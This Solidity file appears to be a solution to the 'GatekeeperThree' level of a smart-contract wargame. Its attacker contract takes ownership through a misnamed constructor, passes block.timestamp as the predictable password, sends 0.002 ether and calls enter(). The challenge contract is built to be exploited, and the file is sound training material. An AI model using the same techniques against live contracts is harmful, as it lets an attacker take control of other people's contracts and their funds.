pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./28-GatekeeperThree.sol";

contract GatekeeperThreeAttacker {

    GatekeeperThree challenge;

    constructor(address payable addr) payable {
        challenge = GatekeeperThree(addr);
    }

    function attack() public {
        challenge.construct0r();
        challenge.createTrick();
        challenge.getAllowance(block.timestamp);
        (bool success, ) = payable(address(challenge)).call{value: 0.002 ether}("");
        require(success, "Failed to transfer eth");
        challenge.enter();
    }

}
